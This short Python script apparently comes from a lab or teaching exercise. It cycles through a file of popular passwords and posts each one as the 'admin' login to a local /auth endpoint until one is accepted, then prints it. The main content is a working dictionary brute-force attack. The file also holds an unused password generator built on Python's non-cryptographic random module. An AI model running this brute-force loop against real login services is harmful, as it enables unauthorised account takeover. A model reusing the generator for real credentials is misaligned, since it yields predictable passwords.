import random

import requests


def good_password_generator(length=10):
    letters = 'abcdefgihjklmnopqrstuvwxyz'
    upper_letters = 'ABCDEFGIHJKLMNOPQRSTUVWXYZ'
    digits = '0123456789'
    symbols = '!@#$%^&*()_+-=\'\\"'

    alphabet = letters + upper_letters + digits + symbols

    password = ''
    for i in range(length):
        char = random.choice(alphabet)
        password += char

    return password


with open('../popular-passwords.txt') as popular_passwords_file:
    popular_passwords = popular_passwords_file.read().split('\n')

counter = 0


def bad_password_generator():
    global counter
    password = popular_passwords[counter]

    counter += 1
    if counter >= len(popular_passwords):
        counter = 0

    return password


while True:
    password = bad_password_generator()
    response = requests.post('http://127.0.0.1:5000/auth',
                             json={'login': 'admin', 'password': password})
    if response.status_code == 200:
        print(password)
        break